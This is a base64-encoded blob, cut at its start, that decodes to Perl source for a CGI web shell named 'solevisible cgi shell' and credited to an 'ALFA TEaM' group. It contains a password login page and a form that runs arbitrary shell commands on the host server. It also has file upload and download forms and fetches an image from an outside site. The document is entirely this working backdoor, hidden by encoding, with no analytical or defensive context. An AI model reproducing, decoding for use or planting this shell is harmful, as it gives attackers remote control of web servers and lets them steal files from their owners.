1kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KCWxvY2FsICgqaW4pID0gQF8gaWYgQF87DQoJbG9jYWwgKCRpLCAkbG9jLCAka2V5LCAkdmFsKTsNCgkNCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsNCg0KCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQoJew0KCQkkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCgl9DQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQoJew0KCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQoJfQ0KDQoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KCXsNCgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgDQoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07DQoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCgkJJEhlYWRlciA9ICRgOw0KCQkkQm9keSA9ICQnOw0KIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyANCgkJJGlueydmJ30gPSAkMTsgDQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsgDQoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsNCgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsNCgkJCSRrZXkgPSAkMTsNCgkJCSR2YWwgPSAkJzsNCgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9ID0gJHZhbDsgDQoJCX0NCgl9DQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQoJew0KCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7DQoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCgkJew0KCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsNCgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSAuPSAiXDAiIGlmIChkZWZpbmVkKCRpbnska2V5fSkpOw0KCQkJJGlueyRrZXl9IC49ICR2YWw7DQoJCX0NCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VIZWFkZXINCnsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPSAkQ3VycmVudERpcjsNCgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5zb2xldmlzaWJsZSBjZ2kgc2hlbGw8L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQoNCjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJzb2xldmlzaWJsZSxhbGZhIHRlYW0sc29sZSBzYWQsaW52aXNpYmxlIj4NCjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJzb2xldmlzaWJsZSxhbGZhIHRlYW0sc29sZSBzYWQsaW52aXNpYmxlIj4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5mb2N1cygpIiBiZ2NvbG9yPSIjMDAwMDAwIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1hcmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIHRleHQ9IiNGRkZGRkYiPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQo8Zm9udCBjb2xvcj0icmVkIj48Yj5jb2RlZCBieSBzb2xlIHNhZCAmIGludmlzaWJsZSB+IHNvbGV2aXNpYmxlW2F0XWdtYWlsLmNvbTwvYj48L2ZvbnQ+DQo8dGQgYmdjb2xvcj0iIzAwMDAwMCIgYm9yZGVyY29sb3I9IiNGRkZGRkYiIGFsaWduPSJjZW50ZXIiIHdpZHRoPSIxJSI+DQo8Yj48Zm9udCBzaXplPSIyIiBjb2xvcj0iI2ZmMDAwMCI+IzwvZm9udD48L2I+PC90ZD4NCjx0ZCBiZ2NvbG9yPSIjMDAwMDAwIiB3aWR0aD0iOTglIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaXplPSIyIj48Yj4gDQo8Zm9udCBjb2xvcj0iIzIyRTIyOCI+PGI+c29sZXZpc2libGUgY2dpIHNoZWxsPC9iPjwvZm9udD4gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGJnY29sb3I9IiMwMDAwMDAiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPg0KDQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KDQo8Zm9udCBzaXplPSIzIj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCSRNZXNzYWdlID0gcSQ8cHJlPjxjZW50ZXI+PGltZyBib3JkZXI9IjAiIHNyYz0iaHR0cDovL3NvbGUtc2FkLnBlcnNpYW5naWcuY29tL2ltYWdlL2ZhcnZhaGFyLnBuZyI+PC9jZW50ZXI+PC9wcmU+PGJyPjxicj48L2ZvbnQ+DQokOw0KIycNCglwcmludCA8PEVORDsNCjxjb2RlPg0KDQpUcnlpbmcgJFNlcnZlck5hbWUuLi48YnI+DQpDb25uZWN0ZWQgdG8gJFNlcnZlck5hbWU8YnI+DQpFc2NhcGUgY2hhcmFjdGVyIGlzIF5dPGJyPg0KPGZvbnQgY29sb3I9IiMyMkUyMjgiPjxiPmNvZGVkIGJ5IHNvbGUgc2FkICYgaW52aXNpYmxlIFtBTEZBIFRFYU1dPGI+PC9mb250Pjxicj4NCjxmb250IGNvbG9yPSJyZWQiPjxiPkNvbnRhY3QgOiBzb2xldmlzaWJsZVthdF1nbWFpbC5jb20gPC9iPjwvZm9udD4NCjxjb2RlPiRNZXNzYWdlDQpFTkQNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5GYWlsZWRNZXNzYWdlDQp7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxicj5sb2dpbjogYWRtaW48YnI+DQpwYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KDQo8Y29kZT4NCg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KPC9mb250Pg0KPGZvbnQgc2l6ZT0iMyI+DQpVc2VyIDogPGZvbnQgY29sb3I9IiMyMkUyMjgiPjxiPnJvb3Q8L2ZvbnQ+PGJyPg0KUGFzc3dvcmQ6PC9mb250Pjxmb250IGNvbG9yPSIjMDA5OTAwIiBzaXplPSIzIj48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InAiPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJcHJpbnQgIjwvZm9udD48L2JvZHk+PC9odG1sPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBHZXRDb29raWVzDQp7DQoJQGh0dHBjb29raWVzID0gc3BsaXQoLzsgLywkRU5WeydIVFRQX0NPT0tJRSd9KTsNCglmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0KCXsNCgkJKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KCQkkQ29va2llc3skaWR9ID0gJHZhbDsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICI8Y29kZT5Db25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj48L2NvZGU+IjsNCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCX0NCgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCiRQcm9tcHQNCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQo8L2NvZGU+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlRG93bmxvYWRGb3JtDQp7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7DQoJcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJkb3dubG9hZCI+DQokUHJvbXB0IGRvd25sb2FkPGJyPjxicj4NCkZpbGVuYW1lOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCjwvZm9ybT4NCjwvY29kZT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmIiBzaXplPSIzNSI+PGJyPjxicj4NCk9wdGlvbnM6ICZuYnNwOzxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ibyIgdmFsdWU9Im92ZXJ3cml0ZSI+DQpPdmVyd3JpdGUgaWYgaXQgRXhpc3RzPGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBDb21tYW5kVGltZW91dA0Kew0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgkJcHJpbnQgPDxFTkQ7DQo8L3htcD4NCg0KPGNvZGU+DQpDb21tYW5kIGV4Y2VlZGVkIG1heGltdW0gdGltZSBvZiAkQ29tbWFuZFRpbWVvdXREdXJhdGlvbiBzZWNvbmQocykuDQo8YnI+S2lsbGVkIGl0IQ0KRU5EDQoJCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOw0KCQkmUHJpbnRQYWdlRm9vdGVyOw0KCQlleGl0Ow0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgRXhlY3V0ZUNvbW1hbmQNCnsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkNCgkJJE9sZERpciA9ICRDdXJyZW50RGlyOw0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJlByaW50UGFnZUhlYWRlcigiYyIpOw0KCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7DQoJCXByaW50ICIkUHJvbXB0ICRSdW5Db21tYW5kIjsNCgl9DQoJZWxzZSAjIHNvbWUgb3RoZXIgY29tbWFuZCwgZGlzcGxheSB0aGUgb3V0cHV0DQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRQcm9tcHQgPSAkV2luTlQgPyAiJEN1cnJlbnREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkQ3VycmVudERpcl1cJCAiOw0KCQlwcmludCAiJFByb21wdCAkUnVuQ29tbWFuZDx4bXA+IjsNCgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KCQlpZighJFdpbk5UKQ0KCQl7DQoJCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KCQkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCQl9DQoJCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCgkJew0KCQkJJHw9MTsNCgkJCSRDb21tYW5kIC49ICIgfCI7DQoJCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJCXdoaWxlKDxDb21tYW5kT3V0cHV0PikNCgkJCXsNCgkJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCQlwcmludCAiJF9cbiI7DQoJCQl9DQoJCQkkfD0wOw0KCQl9DQoJCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KCQl7DQoJCQlwcmludCBgJENvbW1hbmRgOw0KCQl9DQoJCWlmKCEkV2luTlQpDQoJCXsNCgkJCWFsYXJtKDApOw0KCQl9DQoJCXByaW50ICI8L3htcD4iOw0KCX0NCgkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnREb3dubG9hZExpbmtQYWdlDQp7DQoJbG9jYWwoJEZpbGVVcmwpID0gQF87DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCXByaW50IDw8RU5EOw0KPGNvZGU+DQoNClNlbmRpbmcgRmlsZSAkVHJhbnNmZXJGaWxlLi4uPGJyPg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPi4NCkVORA0KCQkmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgl9DQoJZWxzZSAjIGZpbGUgZG9lc24ndCBleGlzdA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigiZiIpOw0KCQlwcmludCAiRmFpbGVkIHRvIGRvd25sb2FkICRGaWxlVXJsOiAkISI7DQoJCSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgU2VuZEZpbGVUb0Jyb3dzZXINCnsNCglsb2NhbCgkU2VuZEZpbGUpID0gQF87DQoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQliaW5tb2RlKFNFTkRGSUxFKTsNCgkJCWJpbm1vZGUoU1RET1VUKTsNCgkJfQ0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCgkJKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOw0KCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQoJCWNsb3NlKFNFTkRGSUxFKTsNCgl9